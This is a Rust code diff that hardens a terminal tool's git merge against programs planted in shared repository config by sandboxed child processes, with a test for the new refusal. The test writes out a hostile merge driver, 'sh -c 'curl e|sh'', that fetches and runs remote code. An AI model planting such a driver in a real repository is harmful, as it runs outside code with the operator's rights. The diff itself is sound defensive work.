@@ -131,13 +131,16 @@ pub fn run(opts: &Options) -> Result<(), String> {
                 let c = branch_log(&s.repo, &branch);
                 s.foreground(c, "git log");
             }
-            Handoff::Merge(branch) => {
-                let c = git_in(&s.repo, &Effect::Merge(branch.clone()));
-                s.foreground(c, "git merge");
-                if s.home.notice.is_none() {
-                    s.home.notice = Some(format!("merged {branch}"));
+            Handoff::Merge(branch) => match merge_refusal(&s.repo) {
+                Some(why) => s.home.notice = Some(why),
+                None => {
+                    let c = git_in(&s.repo, &Effect::Merge(branch.clone()));
+                    s.foreground(c, "git merge");
+                    if s.home.notice.is_none() {
+                        s.home.notice = Some(format!("merged {branch}"));
+                    }
                 }
-            }
+            },
             Handoff::EditTypes => {
                 let file = s.repo.join(crate::run::AGENT_TYPES_FILE);
                 if let Some(dir) = file.parent() {
@@ -1139,15 +1142,54 @@ fn branch_log(repo: &Path, branch: &str) -> std::process::Command {
     git_in(repo, &Effect::Diff(branch.to_string()))
 }
 
+/// Why the TUI will not merge in `repo`, or `None`: the repository's own configuration names a
+/// filter or merge driver ([`crate::gitcmd::repo_drivers`]) — a program a merge would run as the
+/// operator, set where a child could have set it — or git could not say whether it does.
+fn merge_refusal(repo: &Path) -> Option<String> {
+    match crate::gitcmd::repo_drivers(repo) {
+        Ok(keys) if keys.is_empty() => None,
+        Ok(keys) => Some(
+            marion_core::text::visible(&format!(
+                "not merged: this repository's own config sets {}, a program a merge would run; \
+             remove it (git config --unset) or merge by hand",
+                keys.join(", ")
+            ))
+            .into_owned(),
+        ),
+        Err(e) => Some(format!(
+            "not merged: could not read the repository's config: {}",
+            marion_core::text::visible(&e)
+        )),
+    }
+}
+
+/// What [`git_in`] sets over the repository's configuration, which is shared with every worktree a
+/// child wrote in, so any program it names may be one a child planted, run here as the operator
+/// outside any sandbox: no pager, no hooks, no editor (a merge takes git's own message), no
+/// global attributes file, attributes read from `HEAD` (the operator's commit, not the branch
+/// being merged, so a branch's `.gitattributes` selects no driver), and no signing program.
+/// The operator's own hooks and signing do not run on a merge made here.
+const TUI_GIT_HARDENING: &[&str] = &[
+    "--no-pager",
+    "--attr-source=HEAD",
+    "-c",
+    "core.hooksPath=/dev/null",
+    "-c",
+    "core.editor=true",
+    "-c",
+    "core.attributesFile=/dev/null",
+    "-c",
+    "commit.gpgSign=false",
+    "-c",
+    "gpg.program=",
+];
+
 /// **The command line `effect` shows the operator ([`Effect::argv`]), run in `repo` with the
 /// terminal**, so what the box says and what runs cannot drift apart. Through
-/// [`crate::gitcmd::command`] as the operator's checkout, and with no pager and no hooks on top:
-/// the repository's configuration is shared with every worktree a child wrote in, so a
-/// `core.pager` or `core.hooksPath` there may be one a child planted, and this runs as the
-/// operator, outside any sandbox. The operator's own hooks do not run on a merge made here.
+/// [`crate::gitcmd::command`] as the operator's checkout, with [`TUI_GIT_HARDENING`] on top.
 fn git_in(repo: &Path, effect: &Effect) -> std::process::Command {
     let argv = effect.argv().unwrap_or_default();
-    let mut args = vec!["--no-pager", "-c", "core.hooksPath=/dev/null"];
+    let mut args = TUI_GIT_HARDENING.to_vec();
     args.extend(argv.iter().skip(1).map(String::as_str));
     let mut c = crate::gitcmd::command(&crate::gitcmd::Tree::Operator(repo), &args)
         .expect("an operator checkout is never refused");
@@ -1190,8 +1232,17 @@ mod tests {
                 "-c",
                 "core.fsmonitor=false",
                 "--no-pager",
+                "--attr-source=HEAD",
                 "-c",
                 "core.hooksPath=/dev/null",
+                "-c",
+                "core.editor=true",
+                "-c",
+                "core.attributesFile=/dev/null",
+                "-c",
+                "commit.gpgSign=false",
+                "-c",
+                "gpg.program=",
                 "merge",
                 "--no-ff",
                 "--",
@@ -1205,6 +1256,28 @@ mod tests {
                 "{redirect} is cleared"
             );
         }
+    }
+
+    /// **The TUI will not merge where the repository's own config names a driver program**, and
+    /// merges where it names none.
+    #[test]
+    fn a_planted_driver_in_the_repository_config_refuses_the_merge() {
+        let dir = marion_testsupport::scratch("tui-merge-driver");
+        let git = |args: &[&str]| {
+            assert!(
+                std::process::Command::new("git")
+                    .current_dir(&dir)
+                    .args(args)
+                    .status()
+                    .unwrap()
+                    .success()
+            )
+        };
+        git(&["init", "-q"]);
+        assert_eq!(merge_refusal(&dir), None);
+        git(&["config", "merge.evil.driver", "sh -c 'curl e|sh' %A"]);
+        let why = merge_refusal(&dir).expect("refused");
+        assert!(why.contains("merge.evil.driver"), "{why}");
     }
 
     #[test]
